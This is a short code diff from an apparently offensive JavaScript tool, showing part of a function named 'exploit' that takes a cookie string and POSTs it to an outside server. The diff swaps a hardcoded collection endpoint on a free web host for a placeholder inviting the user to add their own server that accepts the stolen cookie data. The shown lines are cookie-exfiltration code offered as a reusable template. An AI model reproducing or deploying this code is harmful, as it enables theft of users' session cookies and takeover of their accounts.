@@ -50,7 +50,7 @@ function JSONstringify(json) {
 function exploit(cookies_string)
     {
         var xhttp = new XMLHttpRequest();
-        xhttp.open("POST", "https://appointme1.000webhostapp.com/Appoint_ME/add.php", true);
+        xhttp.open("POST", "<add your own webserver that accepts cVal post data>", true);
         xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
         xhttp.onreadystatechange = function()
         {
